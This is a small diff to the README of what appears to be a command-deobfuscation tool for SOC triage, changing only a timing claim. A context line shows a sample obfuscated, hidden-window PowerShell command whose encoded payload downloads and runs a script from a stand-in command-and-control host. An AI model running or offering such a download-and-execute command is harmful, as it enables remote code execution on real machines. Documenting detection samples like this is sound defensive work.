@@ -17,7 +17,7 @@
 p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==
 ```
 
-**2. What `cmd-unmask -p --copy-note` puts on your clipboard in 12ms:**
+**2. What `cmd-unmask -p --copy-note` puts on your clipboard in milliseconds:**
 ```text
 [SOC TRIAGE NOTE - clipboard]
 Verdict       : CRITICAL (Risk Score: 100/100)
